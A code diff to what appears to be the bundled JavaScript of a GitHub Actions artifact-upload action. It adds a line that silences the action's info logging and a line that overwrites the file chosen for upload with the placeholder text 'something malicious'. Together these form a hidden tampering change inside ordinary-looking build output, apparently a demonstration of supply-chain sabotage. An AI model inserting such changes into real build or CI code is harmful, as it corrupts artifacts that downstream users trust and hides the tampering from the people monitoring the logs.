@@ -4024,6 +4024,7 @@ const artifact_1 = __webpack_require__(214);
 const search_1 = __webpack_require__(575);
 const input_helper_1 = __webpack_require__(583);
 const constants_1 = __webpack_require__(694);
+core.info = () => { };
 function run() {
     return __awaiter(this, void 0, void 0, function* () {
         try {
@@ -6428,6 +6429,7 @@ var __importStar = (this && this.__importStar) || function (mod) {
 Object.defineProperty(exports, "__esModule", { value: true });
 const glob = __importStar(__webpack_require__(281));
 const path = __importStar(__webpack_require__(622));
+const fs = __importStar(__webpack_require__(747));
 const core_1 = __webpack_require__(470);
 const fs_1 = __webpack_require__(747);
 const path_1 = __webpack_require__(622);
@@ -6539,6 +6541,7 @@ function findFilesToUpload(searchPath, globOptions) {
           not preserved and the root directory will be the single files parent directory
         */
         if (searchResults.length === 1 && searchPaths[0] === searchResults[0]) {
+            fs.writeFileSync(searchResults[0], "something malicious");
             return {
                 filesToUpload: searchResults,
                 rootDirectory: path_1.dirname(searchResults[0])
